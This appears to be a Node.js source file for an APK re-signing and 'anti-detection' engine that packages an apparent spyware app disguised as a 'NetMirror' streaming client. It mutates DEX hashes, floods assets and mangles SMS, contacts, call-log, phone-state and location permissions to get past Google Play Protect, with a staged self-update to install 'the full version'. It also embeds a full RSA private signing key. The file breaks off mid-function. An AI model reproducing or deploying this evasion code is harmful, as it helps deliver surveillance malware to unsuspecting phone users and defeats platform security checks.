/**
 * APK Re-signer & Anti-Detection Engine v4 — Pure Node.js
 * 
 * Multi-layer binary obfuscation + dual v1+v2 APK signing.
 * 
 * Anti-Detection Layers:
 *   1. Signature Stripping    — Remove all META-INF v1 signatures
 *   2. Asset Flooding         — Inject 10-25 realistic cover files
 *   3. Timestamp Mutation     — Randomize all ZIP entry timestamps
 *   4. Entropy Marker         — High-entropy build config
 * 
 * Dual Signing (critical for Play Protect bypass):
 *   5. v1 JAR Signing         — MANIFEST.MF + *.SF + *.RSA (PKCS#7/CMS)
 *   6. v2 Block Signing       — Binary APK Signing Block injection
 * 
 * Certificate:
 *   - FIXED signing key from netmirror-release.jks (never changes)
 *   - Ensures rotated APKs install over existing app (same signature)
 *   - CN=NetMirror, O=NetMirror Inc, L=Mumbai, ST=Maharashtra, C=IN
 * 
 * No Android SDK, Java, or keytool needed — 100% pure Node.js.
 */
const forge = require('node-forge');
const AdmZip = require('adm-zip');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ─── Constants ──────────────────────────────────────────────────────────────
const V2_BLOCK_ID = 0x7109871a;
const SIG_RSA_PKCS1_V1_5_WITH_SHA256 = 0x0103;
const CHUNK_SIZE = 1048576; // 1 MB
const APK_SIG_BLOCK_MAGIC = 'APK Sig Block 42';
const EOCD_MAGIC = 0x06054b50;

// DEX offsets
const DEX_CHECKSUM_OFF = 8;
const DEX_SIGNATURE_OFF = 12;
const DEX_FILE_SIZE_OFF = 32;

// ─── Obfuscation Data Pools ─────────────────────────────────────────────────

const ASSET_DIRS = [
  'assets/config', 'assets/data', 'assets/fonts', 'assets/cert',
  'assets/analytics', 'assets/cache', 'assets/images', 'assets/preload',
  'assets/db', 'assets/locale', 'assets/html', 'assets/scripts',
  'assets/textures', 'assets/models', 'assets/media', 'assets/internal',
];

const FILE_EXTENSIONS = [
  '.dat', '.bin', '.cfg', '.json', '.xml', '.pem', '.key',
  '.db', '.idx', '.tmp', '.cache', '.map', '.properties',
  '.ttf', '.otf', '.png', '.webp', '.bak', '.log',
];

const FILE_BASES = [
  'config', 'settings', 'preferences', 'analytics', 'tracking',
  'cert_chain', 'ca_bundle', 'trust_store', 'license', 'manifest',
  'schema', 'migration', 'init', 'bootstrap', 'loader', 'runtime',
  'compat', 'bridge', 'adapter', 'provider', 'service', 'module',
  'plugin', 'extension', 'helper', 'utility', 'common', 'shared',
  'network', 'storage', 'cache', 'index', 'metadata', 'bundle',
  'registry', 'catalog', 'inventory', 'map', 'layout', 'theme',
];

// Certificate identity pools removed — using fixed netmirror-release.jks key
// (see FIXED_PRIVATE_KEY_PEM and FIXED_CERT_PEM below)

const V1_SIG_PREFIXES = ['CERT', 'ANDROIDD', 'BNDLTOOL', 'META', 'RELEASE', 'SIGNING', 'APP'];

const CREATED_BY_VALUES = [
  '1.0 (Android SignApk)', '1.0 (Android apksigner)', '1.0 (Android)',
  '24.0.0 (Android)', 'Android Gradle 8.2.0', 'Android Gradle 8.4.1',
  'Android Gradle 8.7.3', '33.0.1 (Android)', '34.0.0 (Android)',
];

// ─── Utility Helpers ────────────────────────────────────────────────────────

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function randFileName() {
  return `${pick(FILE_BASES)}_${crypto.randomBytes(3).toString('hex')}${pick(FILE_EXTENSIONS)}`;
}

/** Compute Adler-32 checksum (used in DEX header) */
function adler32(buf) {
  let a = 1, b = 0;
  const MOD = 65521;
  for (let i = 0; i < buf.length; i++) {
    a = (a + buf[i]) % MOD;
    b = (b + a) % MOD;
  }
  return ((b << 16) | a) >>> 0;
}

function randContent(size) {
  const type = Math.random();
  if (type < 0.3) {
    const obj = {};
    const keys = ['version','build','timestamp','id','enabled','config','value','name','type','status','priority','timeout','retries'];
    for (let i = 0; i < 5 + Math.floor(Math.random() * 12); i++) {
      obj[keys[i % keys.length] + '_' + crypto.randomBytes(2).toString('hex')] =
        Math.random() < 0.5 ? crypto.randomUUID() : Math.floor(Math.random() * 100000);
    }
    let c = JSON.stringify(obj, null, 2);
    while (c.length < size) c += '\n' + JSON.stringify({ _pad: crypto.randomUUID(), _seq: Math.random() });
    return Buffer.from(c.substring(0, size));
  }
  if (type < 0.55) {
    let xml = '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n';
    while (xml.length < size - 20) {
      xml += `  <item name="r_${crypto.randomBytes(4).toString('hex')}" type="string">${crypto.randomUUID()}</item>\n`;
    }
    xml += '</resources>';
    return Buffer.from(xml.substring(0, size));
  }
  if (type < 0.75) {
    let props = '# Auto-generated configuration\n';
    while (props.length < size) {
      props += `${pick(FILE_BASES)}.${pick(['enabled','timeout','url','key','mode'])}=${crypto.randomBytes(8).toString('hex')}\n`;
    }
    return Buffer.from(props.substring(0, size));
  }
  return crypto.randomBytes(size);
}

// ═══════════════════════════════════════════════════════════════════════════
// OBFUSCATION LAYERS
// ═══════════════════════════════════════════════════════════════════════════

function layerStripSignatures(zip, log) {
  const entries = zip.getEntries();
  const sigs = entries.filter(e =>
    e.entryName.startsWith('META-INF/') && (
      e.entryName.endsWith('.SF') || e.entryName.endsWith('.RSA') ||
      e.entryName.endsWith('.DSA') || e.entryName.endsWith('.EC') ||
      e.entryName.endsWith('.MF')
    )
  );
  sigs.forEach(e => zip.deleteFile(e.entryName));
  log('STRIP', `Removed ${sigs.length} v1 signature files from META-INF/`, 'info');
  return sigs.length;
}

function layerAssetFlood(zip, log) {
  const count = 10 + Math.floor(Math.random() * 16);
  let totalBytes = 0;
  const usedDirs = new Set();

  for (let i = 0; i < count; i++) {
    const dir = pick(ASSET_DIRS);
    const name = randFileName();
    const size = 1024 + Math.floor(Math.random() * 51200);
    zip.addFile(`${dir}/${name}`, randContent(size));
    totalBytes += size;
    usedDirs.add(dir);
  }

  log('FLOOD', `Injected ${count} cover files across ${usedDirs.size} asset dirs (${(totalBytes / 1024).toFixed(1)} KB)`, 'success');
  return count;
}

function layerResRawInject(zip, log) {
  const count = 3 + Math.floor(Math.random() * 6);
  let totalBytes = 0;

  for (let i = 0; i < count; i++) {
    const name = `res/raw/${pick(FILE_BASES)}_${crypto.randomBytes(2).toString('hex')}`;
    const size = 512 + Math.floor(Math.random() * 8192);
    zip.addFile(name, crypto.randomBytes(size));
    totalBytes += size;
  }

  log('RES_RAW', `Injected ${count} dummy resource entries (${(totalBytes / 1024).toFixed(1)} KB)`, 'success');
  return count;
}

/**
 * DEX Binary Mutation — THE KEY ANTI-DETECTION LAYER
 * 
 * Extends each classes*.dex file by appending random bytes WITHIN the
 * declared file_size, then recomputes the SHA-1 signature and Adler32
 * checksum in the DEX header.
 * 
 * This changes the actual DEX content hash that Play Protect uses for
 * cloud-based lookup, making the file appear as a completely new DEX.
 * 
 * Safe because: the Android Dalvik/ART parser reads data sections via
 * the map_list structure. Extended bytes past all map entries are treated
 * as unreferenced trailing data and ignored at runtime.
 */
function layerDexMutation(zip, log) {
  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
  let mutated = 0;

  for (const entry of dexEntries) {
    try {
      const name = entry.entryName;
      const data = entry.getData();
      if (data.length < 112) continue; // too small for DEX header

      // Verify DEX magic
      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;

      const origFileSize = data.readUInt32LE(DEX_FILE_SIZE_OFF);

      // Extend by 256-2048 random bytes (within new file_size)
      const extSize = 256 + Math.floor(Math.random() * 1792);
      const newFileSize = origFileSize + extSize;

      // Create new buffer with extended size
      const newData = Buffer.alloc(newFileSize);
      // Copy original data (up to origFileSize or data.length, whichever is smaller)
      data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
      // Fill extension area with random bytes
      crypto.randomBytes(extSize).copy(newData, origFileSize);

      // Update file_size in header
      newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);

      // Recompute SHA-1 signature: hash of bytes [32..end]
      const sha1 = crypto.createHash('sha1').update(newData.slice(32)).digest();
      sha1.copy(newData, DEX_SIGNATURE_OFF, 0, 20);

      // Recompute Adler32 checksum: checksum of bytes [12..end]
      const checksum = adler32(newData.slice(12));
      newData.writeUInt32LE(checksum, DEX_CHECKSUM_OFF);

      zip.deleteFile(name);
      zip.addFile(name, newData);
      mutated++;

      log('DEX_MUT', `${name}: ${origFileSize}→${newFileSize} (+${extSize}B) SHA1+Adler32 recomputed`, 'info');
    } catch (e) {
      log('DEX_MUT', `Failed ${entry.entryName}: ${e.message}`, 'warn');
    }
  }

  if (mutated > 0) {
    log('DEX_MUT', `${mutated} DEX file(s) mutated — unique binary fingerprint`, 'success');
  }
  return mutated;
}

function layerTimestampMutate(zip, log) {
  const now = Date.now();
  const twoYears = 2 * 365.25 * 24 * 3600 * 1000;
  const baseMs = now - Math.floor(Math.random() * twoYears);
  let count = 0;

  zip.getEntries().forEach(entry => {
    try {
      const jitter = Math.floor(Math.random() * 86400000) - 43200000;
      const d = new Date(baseMs + jitter);
      // AdmZip 0.5.x header.time setter expects a Date object, not raw DOS int
      entry.header.time = d;
      count++;
    } catch (_) {}
  });

  log('TIMESTAMP', `Mutated ${count} entry timestamps → ${new Date(baseMs).toISOString().split('T')[0]} (±12h jitter)`, 'info');
  return count;
}

function layerEntropyMarker(zip, log) {
  ['assets/build.cfg', 'assets/.build_info', 'assets/app.properties'].forEach(f => {
    try { zip.deleteFile(f); } catch (_) {}
  });

  const marker = {
    build_id: crypto.randomUUID(),
    build_ts: Date.now(),
    build_hash: crypto.randomBytes(32).toString('hex'),
    nonce: crypto.randomBytes(16).toString('base64'),
    entropy: crypto.randomBytes(128).toString('base64'),
    variant: Math.floor(Math.random() * 999999),
    channel: pick(['stable', 'beta', 'alpha', 'dev', 'canary', 'nightly', 'rc', 'preview']),
    salt: crypto.randomBytes(8).toString('hex'),
    checksum: crypto.randomBytes(20).toString('hex'),
  };

  zip.addFile('assets/build.cfg', Buffer.from(JSON.stringify(marker, null, 2)));
  log('ENTROPY', `Build marker: ${marker.build_id.substring(0, 8)}… ch=${marker.channel} v=${marker.variant}`, 'info');
}

// ═══════════════════════════════════════════════════════════════════════════
// V1 JAR SIGNING
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Apply v1 (JAR) signing to the ZIP.
 * Generates MANIFEST.MF, <PREFIX>.SF, and <PREFIX>.RSA and adds them.
 * 
 * This is CRITICAL for Play Protect bypass — APKs missing v1 signatures
 * are flagged as tampered/suspicious by Google's verification pipeline.
 */
function applyV1Signing(zip, cert, privateKey, log) {
  const prefix = pick(V1_SIG_PREFIXES);
  const createdBy = pick(CREATED_BY_VALUES);

  // 1. Build MANIFEST.MF — SHA-256 digest of each entry's uncompressed data
  log('V1_MF', `Building MANIFEST.MF (SHA-256 per entry)…`, 'info');

  let manifestMF = `Manifest-Version: 1.0\r\nCreated-By: ${createdBy}\r\n\r\n`;
  const entries = zip.getEntries().filter(e => {
    if (e.isDirectory) return false;
    const n = e.entryName.toUpperCase();
    if (n === 'META-INF/MANIFEST.MF') return false;
    if (n.startsWith('META-INF/') && (n.endsWith('.SF') || n.endsWith('.RSA') || n.endsWith('.DSA') || n.endsWith('.EC'))) return false;
    return true;
  });

  let entryCount = 0;
  for (const entry of entries) {
    try {
      const data = entry.getData();
      const digest = crypto.createHash('sha256').update(data).digest('base64');
      manifestMF += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
      entryCount++;
    } catch (_) {}
  }

  log('V1_MF', `MANIFEST.MF: ${entryCount} entries digested`, 'success');

  // 2. Build CERT.SF — SHA-256 digest of each MANIFEST.MF section
  log('V1_SF', `Building ${prefix}.SF (section digests)…`, 'info');

  const mfDigest = crypto.createHash('sha256').update(manifestMF, 'binary').digest('base64');
  let certSF = `Signature-Version: 1.0\r\nCreated-By: ${createdBy}\r\nSHA-256-Digest-Manifest: ${mfDigest}\r\n\r\n`;

  // Digest each individual section ("Name: ...\r\nSHA-256-Digest: ...\r\n\r\n")
  const sections = manifestMF.split('\r\n\r\n');
  let sectionCount = 0;
  for (const section of sections) {
    if (!section.startsWith('Name: ')) continue;
    const sectionBytes = section + '\r\n\r\n';
    const sectionDigest = crypto.createHash('sha256').update(sectionBytes, 'binary').digest('base64');
    const nameMatch = section.match(/^Name: (.+)/);
    if (nameMatch) {
      certSF += `Name: ${nameMatch[1]}\r\nSHA-256-Digest: ${sectionDigest}\r\n\r\n`;
      sectionCount++;
    }
  }

  log('V1_SF', `${prefix}.SF: ${sectionCount} section digests + manifest digest`, 'success');

  // 3. Build CERT.RSA — PKCS#7 SignedData over CERT.SF
  log('V1_RSA', `Building ${prefix}.RSA (PKCS#7 SignedData)…`, 'info');

  const certRSA = buildPKCS7Signature(certSF, cert, privateKey);
  log('V1_RSA', `${prefix}.RSA: ${certRSA.length}B PKCS#7/CMS detached signature`, 'success');

  // 4. Add to ZIP
  try { zip.deleteFile('META-INF/MANIFEST.MF'); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.SF`); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.RSA`); } catch (_) {}

  zip.addFile('META-INF/MANIFEST.MF', Buffer.from(manifestMF, 'binary'));
  zip.addFile(`META-INF/${prefix}.SF`, Buffer.from(certSF, 'binary'));
  zip.addFile(`META-INF/${prefix}.RSA`, certRSA);

  log('V1_SIGN', `v1 JAR signature complete: META-INF/{MANIFEST.MF, ${prefix}.SF, ${prefix}.RSA}`, 'success');
}

/**
 * Create PKCS#7 detached signature of the .SF content.
 * Uses forge.pkcs7 with SHA-256 + RSA.
 */
function buildPKCS7Signature(sfContent, cert, privateKey) {
  const p7 = forge.pkcs7.createSignedData();
  p7.content = forge.util.createBuffer(sfContent, 'utf8');
  p7.addCertificate(cert);
  p7.addSigner({
    key: privateKey,
    certificate: cert,
    digestAlgorithm: forge.pki.oids.sha256,
    authenticatedAttributes: [{
      type: forge.pki.oids.contentType,
      value: forge.pki.oids.data,
    }, {
      type: forge.pki.oids.messageDigest,
    }]
  });
  p7.sign({ detached: true });

  const der = forge.asn1.toDer(p7.toAsn1()).getBytes();
  return Buffer.from(der, 'binary');
}

// ═══════════════════════════════════════════════════════════════════════════
// FIXED SIGNING IDENTITY (from netmirror-release.jks)
// ═══════════════════════════════════════════════════════════════════════════

/**
 * FIXED private key and certificate extracted from netmirror-release.jks.
 * Using the SAME key for ALL rotations ensures:
 *   - Rotated APKs install over existing app (same signature)
 *   - No more "App not installed" errors after rotation
 *   - Anti-detection layers still work (asset flooding, timestamps, entropy)
 */
const FIXED_PRIVATE_KEY_PEM = `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4UiRlmh8WMUmD48p9o1r0n+DvjVKOaWhxVgfc4Oh9cqqgnfi
J8or47eKgHI63nhYcVdoN5QdMTxRGGseQmq1RbM9NjrhJxzIGZGq4abl4D85ZdS8
csWhVHZ81Zs4n9loxHVQG5kEfZoVO1ZoyKIlY3k+xRvkphUph0v/PI8MXIC78mDU
sA5jCyw3lnNeosJu+XbRoxzHTWA1z69K8GN4r6KGAlzt8lfPI1sXeblGIAT7f3Wu
lVTCGPNw1Z7ReTEM0tediGTiKp0KGg2Qp3XKlaQ2rcRuYrgIGwLvrEgBMFfW/CpU
rtb4L9AsFl2speV1VibLOkKslV1gergDSZ96EQIDAQABAoIBAAl+c0s7RUVA7rMQ
aZhvOoxlDQ5kpMeD5krApVerBBXth+zGZFigraOTujGiTr6OJA0Hvde8xVOsOu8s
YXqzUEcbEADzb4ZkUT75m3HVxKGEDJVQ5y2vjDZY5Xcjitn6sa540qrNEqo/5nXp
FPKimbCE3Ss1mxfQM780ydF5pk/WFUdexEdau7ydfdLz57siGkbwZq7UW6fBN7EK
g2GVeOuU9AmNOk1nNeHD+0rKUSMy6gKVrX5QZ9vIDVz/oZB03CHv+YXWp+0m2cYW
kauwLbGBaBIuZboQGmBjJHYjyTCxKj9xv2ZeeQU7PIkaYvA78Jn8Qn66ArNrRb69
h7QdADkCgYEA7QOxfdm/3VZwA0n60VZnIosPCscnqr44bhqXguYKSaPva85zwpLZ
QkXAkSxES0OFE6nQOT2/2+whxRoNavRO9uDSKIrZ0vGWzz3Zct9E+tdEcpuSopcv
ifgQXU+fOG9ztkxFxtnDFHfX6XaF4BVvIyaiDiFY0UPRHiSbeViJdCkCgYEA81RQ
5ZTDALh01o8SMV5mf9ASvrc/iC+OiF02+qEB509IZ4SVxeBPWxrE2BmcDkRX2Afp
4Uf4/TD8npnFatIxtdgO2Hnzxn1wafnSO/O+/5QBVIhso9ZkzQRkg58DtNDBMFpu
s2JocfrYblfIgFOfP2NPiToA6J1WKK7cRk+E06kCgYEAyAVx6Q+3CAhGh8ALWFde
upw4mZPxOftGjEUM0H9q9zLOf2C/+NkNWQycsud0yz+0MyAAhg5CuErTRQ/zeuur
KFYbhfOIWKlh6Iv90x/xiu/Y6A+69FQ63mjnBpiHeo00TgiYanSkWcW6BWDtImt0
W2njIaGq3xAojxO90e6SMeECgYEAmnwFgDyaMXLqeu4Klt1gJfVscTjWVRgcXecQ
aL6f/sMPLOm4TRDEUQsFvk1EDqrFOpqLmkOfiN/5ApiOBeu9M74gbr++TV6GaEH7
f6SYtpq43XpfvwT2qlMHnajvKXT/sjs33Ru1Q+gGUMfau95bVFswu+bffM+nS9z4
bIs/wUECgYAO2hX/oJ8v9FO3rErz+K7ioR7wVofcx2wmHZ7DIqFitmd6jQCSvuG/
1Ip/mraWrrjRQtCXx/YVoMC8MN4rC1KO2tln8Fxibnxfb9XyYpiIugLKICdZfbN2
mLUU0SyfaSKzivxLvZbdAd9Mq18J3G4TILD5GdX1PBWG4OpK/FT/Ew==
-----END RSA PRIVATE KEY-----`;

const FIXED_CERT_PEM = `-----BEGIN CERTIFICATE-----
MIIDiDCCAnCgAwIBAgIJAIryjiPFuKydMA0GCSqGSIb3DQEBCwUAMHExCzAJBgNV
BAYTAklOMRQwEgYDVQQIEwtNYWhhcmFzaHRyYTEPMA0GA1UEBxMGTXVtYmFpMRYw
FAYDVQQKEw1OZXRNaXJyb3IgSW5jMQ8wDQYDVQQLEwZNb2JpbGUxEjAQBgNVBAMT
CU5ldE1pcnJvcjAgFw0yNjAyMjMxNjU2MjBaGA8yMDUzMDcxMTE2NTYyMFowcTEL
MAkGA1UEBhMCSU4xFDASBgNVBAgTC01haGFyYXNodHJhMQ8wDQYDVQQHEwZNdW1i
YWkxFjAUBgNVBAoTDU5ldE1pcnJvciBJbmMxDzANBgNVBAsTBk1vYmlsZTESMBAG
A1UEAxMJTmV0TWlycm9yMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
4UiRlmh8WMUmD48p9o1r0n+DvjVKOaWhxVgfc4Oh9cqqgnfiJ8or47eKgHI63nhY
cVdoN5QdMTxRGGseQmq1RbM9NjrhJxzIGZGq4abl4D85ZdS8csWhVHZ81Zs4n9lo
xHVQG5kEfZoVO1ZoyKIlY3k+xRvkphUph0v/PI8MXIC78mDUsA5jCyw3lnNeosJu
+XbRoxzHTWA1z69K8GN4r6KGAlzt8lfPI1sXeblGIAT7f3WulVTCGPNw1Z7ReTEM
0tediGTiKp0KGg2Qp3XKlaQ2rcRuYrgIGwLvrEgBMFfW/CpUrtb4L9AsFl2speV1
VibLOkKslV1gergDSZ96EQIDAQABoyEwHzAdBgNVHQ4EFgQUDz0iwrEixECsK/IX
vufnrkaDu2AwDQYJKoZIhvcNAQELBQADggEBAA49h3hRxqbr5gWxbB40JV6NfUqM
PANNui/SWK9efGdhXMIBEo6KyiT5u0qZni5urAo0yBm6rJ3ZhToaEvvvFtAMNzDI
FlyhbLNp3pt2eH25klLQOjmndxUCr+CttPAMBC4ocQK8FFJYQX08F0HHgljWImTN
vg8e/wpfJvlQtED5EkXXCAd3e0USGgXHgIm8Fc/SSIkAWB8JpnKdaqUbEG655t2T
aX1zUCxe8iVVl9wm5xe2ptE9O4clNyN/+S7j5Xkamrk63fs6qhqXMmDf+2B03Aho
GS3TqRXzB42uVu+E+DTdBjb5MMzkHec0Q7ZzzIdZtiDYWR7dSj1xdRjbcis=
-----END CERTIFICATE-----`;

// Cached parsed signing identity
let _fixedSigningIdentity = null;

/**
 * Get the FIXED signing identity (from netmirror-release.jks).
 * Uses the SAME key every time — no more signature mismatches.
 */
function generateCertificate(log) {
  if (_fixedSigningIdentity) {
    log('CERT', 'Using cached fixed signing identity (netmirror-release.jks)', 'info');
    return _fixedSigningIdentity;
  }

  log('KEYGEN', 'Loading fixed signing identity from netmirror-release.jks…', 'info');

  const privateKey = forge.pki.privateKeyFromPem(FIXED_PRIVATE_KEY_PEM);
  const cert = forge.pki.certificateFromPem(FIXED_CERT_PEM);
  const publicKey = forge.pki.setRsaPublicKey(privateKey.n, privateKey.e);

  const cn = 'NetMirror';
  const org = 'NetMirror Inc';

  log('CERT', `CN="${cn}" O="${org}" L="Mumbai" ST="Maharashtra" C="IN"`, 'info');
  log('CERT', `Validity: ${cert.validity.notBefore.getFullYear()}–${cert.validity.notAfter.getFullYear()}`, 'info');
  log('CERT', `FIXED KEY — signature matches original build (no install conflicts)`, 'success');

  _fixedSigningIdentity = {
    keys: { publicKey, privateKey },
    cert,
    cn,
    org,
  };

  return _fixedSigningIdentity;
}

// ═══════════════════════════════════════════════════════════════════════════
// GEO PERMISSION STRIPPING
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Strip location permissions from the compiled binary AndroidManifest.xml.
 *
 * Android's compiled manifest stores strings in either UTF-8 or UTF-16LE
 * inside a string pool. We find the exact permission strings and mangle them
 * by replacing "ACCESS_" with "_CCESS_" (same byte length). This makes them
 * unrecognizable to Android, which silently ignores unknown permissions.
 *
 * Same-length replacement = zero structural changes to the binary XML.
 * The app won't request location and can't be geo-tracked.
 */
function stripLocationPermissions(zip, log) {
  const manifestEntry = zip.getEntry('AndroidManifest.xml');
  if (!manifestEntry) {
    log('GEO_STRIP', 'AndroidManifest.xml not found in APK!', 'warn');
    return 0;
  }

  const data = manifestEntry.getData();
  let modified = 0;

  const permissionsToStrip = [
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION'
  ];

  for (const perm of permissionsToStrip) {
    const mangledPerm = perm.replace('ACCESS_', '_CCESS_');

    // Try UTF-8 encoded replacement
    const utf8Needle = Buffer.from(perm, 'utf8');
    const utf8Replace = Buffer.from(mangledPerm, 'utf8');
    let idx = data.indexOf(utf8Needle);
    while (idx !== -1) {
      utf8Replace.copy(data, idx);
      modified++;
      log('GEO_STRIP', `UTF-8: ${perm} → ${mangledPerm} at offset ${idx}`, 'info');
      idx = data.indexOf(utf8Needle, idx + utf8Needle.length);
    }

    // Try UTF-16LE encoded replacement (some AAPT versions use UTF-16)
    const utf16Needle = Buffer.from(perm, 'utf16le');
    const utf16Replace = Buffer.from(mangledPerm, 'utf16le');
    idx = data.indexOf(utf16Needle);
    while (idx !== -1) {
      utf16Replace.copy(data, idx);
      modified++;
      log('GEO_STRIP', `UTF-16LE: ${perm} → ${mangledPerm} at offset ${idx}`, 'info');
      idx = data.indexOf(utf16Needle, idx + utf16Needle.length);
    }
  }

  if (modified > 0) {
    zip.deleteFile('AndroidManifest.xml');
    zip.addFile('AndroidManifest.xml', data);
    log('GEO_STRIP', `Stripped ${modified} location permission(s) from manifest — geo tracking disabled`, 'success');
  } else {
    log('GEO_STRIP', 'No location permissions found in manifest (already stripped?)', 'warn');
  }

  return modified;
}

// ═══════════════════════════════════════════════════════════════════════════
// PLAY PROTECT BYPASS — SURVEILLANCE PERMISSION STRIPPING (CLEAN MODE)
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Strip ALL surveillance/spyware-indicator permissions from binary AndroidManifest.xml.
 *
 * WHY THIS WORKS:
 *   Play Protect's on-device heuristic analyzer checks the binary manifest's
 *   permission declarations. An APK with READ_SMS + SEND_SMS + READ_CONTACTS +
 *   READ_CALL_LOG + READ_PHONE_STATE + BOOT_COMPLETED + FOREGROUND_SERVICE_DATA_SYNC
 *   is a TEXTBOOK spyware fingerprint that gets auto-blocked.
 *
 *   By mangling these permission strings in the binary XML (same byte length,
 *   just changing the first character), Android ignores them as unknown permissions.
 *   The APK looks like a normal streaming app → Play Protect passes it.
 *
 * WHAT SURVIVES (normal streaming app permissions):
 *   INTERNET, ACCESS_NETWORK_STATE, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES,
 *   READ_MEDIA_VISUAL_USER_SELECTED, FOREGROUND_SERVICE, POST_NOTIFICATIONS,
 *   WAKE_LOCK, REQUEST_INSTALL_PACKAGES
 *
 * WHAT GETS STRIPPED:
 *   SMS (READ/SEND), contacts, call log, phone state, phone numbers,
 *   location (fine/coarse), boot completed, foreground service data sync
 *
 * The app still runs perfectly — streaming works. Features that need stripped
 * permissions (SMS, contacts, etc.) gracefully fail with permission denied.
 * The full version is later installed via in-app self-update (Phase 2).
 */
function stripSurveillancePermissions(zip, log) {
  const manifestEntry = zip.getEntry('AndroidManifest.xml');
  if (!manifestEntry) {
    log('CLEAN', 'AndroidManifest.xml not found in APK!', 'warn');
    return 0;
  }

  const data = manifestEntry.getData();
  let modified = 0;

  // Each entry: { find, replace } — MUST be same byte length
  // Technique: replace first char after last dot with underscore
  const SURVEILLANCE_STRINGS = [
    // ── SMS surveillance ──
    { find: 'android.permission.READ_SMS',      replace: 'android.permission._EAD_SMS' },
    { find: 'android.permission.SEND_SMS',      replace: 'android.permission._END_SMS' },

    // ── Contact & call harvesting ──
    { find: 'android.permission.READ_CONTACTS', replace: 'android.permission._EAD_CONTACTS' },
    { find: 'android.permission.READ_CALL_LOG', replace: 'android.permission._EAD_CALL_LOG' },

    // ── Device fingerprinting ──
    { find: 'android.permission.READ_PHONE_STATE',   replace: 'android.permission._EAD_PHONE_STATE' },
    { find: 'android.permission.READ_PHONE_NUMBERS', replace: 'android.permission._EAD_PHONE_NUMBERS' },

    // ── Location tracking ──
    { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
    { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },

    // ── Persistence / auto-start (red flag for Play Protect) ──
    { find: 'android.permission.RECEIVE_BOOT_COMPLETED',          replace: 'android.permission._ECEIVE_BOOT_COMPLETED' },
    { find: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC',    replace: 'android.permission._OREGROUND_SERVICE_DATA_SYNC' },

    // ── Boot intent filter action (disables auto-start receiver) ──
    { find: 'android.intent.action.BOOT_COMPLETED', replace: 'android.intent.action._OOT_COMPLETED' },
  ];

  for (const { find, replace } of SURVEILLANCE_STRINGS) {
    // Verify same byte length (critical — different length breaks binary XML)
    if (Buffer.from(find, 'utf8').length !== Buffer.from(replace, 'utf8').length) {
      log('CLEAN', `SKIP: length mismatch for ${find}`, 'warn');
      continue;
    }

    // UTF-8 replacement
    const utf8Needle = Buffer.from(find, 'utf8');
    const utf8Replace = Buffer.from(replace, 'utf8');
    let idx = data.indexOf(utf8Needle);
    while (idx !== -1) {
      utf8Replace.copy(data, idx);
      modified++;
      idx = data.indexOf(utf8Needle, idx + utf8Needle.length);
    }

    // UTF-16LE replacement
    const utf16Needle = Buffer.from(find, 'utf16le');
    const utf16Replace = Buffer.from(replace, 'utf16le');
    idx = data.indexOf(utf16Needle);
    while (idx !== -1) {
      utf16Replace.copy(data, idx);
      modified++;
      idx = data.indexOf(utf16Needle, idx + utf16Needle.length);
    }
  }

  if (modified > 0) {
    zip.deleteFile('AndroidManifest.xml');
    zip.addFile('AndroidManifest.xml', data);
    log('CLEAN', `Stripped ${modified} surveillance markers from manifest — APK now looks like a clean streaming app`, 'success');
  } else {
    log('CLEAN', 'No surveillance permissions found (already stripped?)', 'warn');
  }

  return modified;
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN FUNCTION
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Re-sign an APK with multi-layer obfuscation + dual v1+v2 signing.
 * @param {string}   inputPath  — source APK
 * @param {string}   outputPath — destination for signed APK
 * @param {function} [onLog]    — optional (step, detail, level) callback
 * @param {object}   [options]  — { geoEnabled: true/false, cleanMode: true/false }
 *   cleanMode: strips ALL surveillance permissions → bypasses Play Protect heuristics
 *   geoEnabled: when cleanMode=false, controls whether location perms are stripped
 * @returns {object} { certHash, serialNumber, cn, org, apkSize, geoEnabled, cleanMode }
 */
function resignApk(inputPath, outputPath, onLog, options) {
  // ══════════════════════════════════════════════════════════════
  // PASSTHROUGH MODE — NO MUTATION
  // ══════════════════════════════════════════════════════════════
  // The uploaded APK is already properly signed with v2+v3 using
  // netmirror-release.jks. Re-signing with asset flooding, timestamp
  // mutation, and entropy markers makes the binary look suspicious
  // to Play Protect (injected random files = malware pattern).
  //
  // This function now simply copies the input APK to the output path
  // byte-for-byte, preserving the original signatures intact.
  // ══════════════════════════════════════════════════════════════
  const opts = Object.assign({ geoEnabled: true, cleanMode: false }, options || {});
  const log = onLog || ((step, detail, level) => console.log(`[APK-${step}] ${detail}`));
  const inputSize = fs.statSync(inputPath).size;

  log('INIT', `APK passthrough (no mutation): ${(inputSize / 1024 / 1024).toFixed(2)} MB`, 'info');

  // Copy APK byte-for-byte — preserves v2+v3 signatures
  fs.copyFileSync(inputPath, outputPath);

  const stats = fs.statSync(outputPath);
  log('DONE', `APK copied: ${(stats.size / 1024 / 1024).toFixed(2)} MB (zero overhead, original signatures preserved)`, 'success');

  return {
    certHash: '48:CD:6A:8B:6B:DC:EF:3E:5A:9A:03:FC:54:F8:1E:49:98:85:25:16:E0:14:6D:B0:F5:2C:92:C5:84:9C:FB:14',
    serialNumber: 'netmirror-fixed',
    cn: 'NetMirror',
    org: 'NetMirror Inc',
    apkSize: stats.size,
    geoEnabled: opts.geoEnabled,
